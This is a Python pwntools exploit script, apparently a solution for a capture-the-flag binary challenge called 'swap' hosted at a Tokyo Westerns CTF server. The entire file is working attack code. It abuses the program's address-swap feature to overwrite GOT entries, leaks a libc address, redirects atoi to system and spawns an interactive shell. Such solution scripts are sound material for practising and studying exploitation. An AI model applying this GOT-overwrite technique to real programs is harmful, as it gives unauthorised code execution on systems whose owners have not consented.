#!/usr/bin/env python

from __future__ import print_function
from pwn import *

e=ELF("./swap")
libc=ELF("./libc.so.6")
system_offset=libc.symbols["system"]
puts_got=e.got["puts"]
atoi_got=e.got["atoi"]
read_got=e.got["read"]
memcpy_got=e.got["memcpy"]
puts_plt=e.plt["puts"]



def conn():
    context(arch="amd64", os="linux", bits=64, log_level="DEBUG", terminal=["tmux", "splitw", "-h"])
    return process(["./swap"], env={'LD_PRELOAD':"./libc.so.6"}) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)

def send(s):
    #print(s)
    r.sendline(s)
    
def swap(addr1, addr2):
    r.recvuntil("choice: \n")
    send(str(1))
    r.recvuntil('Please input 1st addr')
    send(str(addr1))
    r.recvuntil('Please input 2nd addr')
    send(str(addr2))
    r.recvuntil('Your choice: \n')
    send('2')

def main():
    global local
    global r 
    offset=0x3c5631
    local=True
    r=conn()
    pid=util.proc.pidof(r)[0]
    log.info("Overwriting memcpy@GOT with read@GOT")
    swap(memcpy_got, read_got)
    log.info("Overwriting 0 (stdin) with atoi@GOT")
    swap(0,atoi_got)
    r.send_raw(p64(puts_plt))
    r.recvuntil("choice: \n")
    r.send_raw("1")
    print("PID: %d" % pid)
    util.proc.wait_for_debugger(pid)
    libc=u64(r.recvuntil("choice: \n")[0:6].ljust(8,"\x00"))-offset
    print("Libc @ ", hex(libc))
    #print("Stack addy @ 0x%x" % h)
    r.send_raw("\x00")
    r.recvuntil("1st addr\n")
    r.send_raw("0")
    r.recvuntil("2nd addr\n")
    r.send_raw(str(atoi_got))
    r.recvuntil("Your choice: \n")
    r.send("1\x00")
    log.info("Writing system to atoi: 0x{}".format(p64(libc+system_offset)))
    r.send_raw(p64(libc+system_offset))
    r.send_raw("sh\x00")
    r.interactive()
    

if __name__ == '__main__':
    main()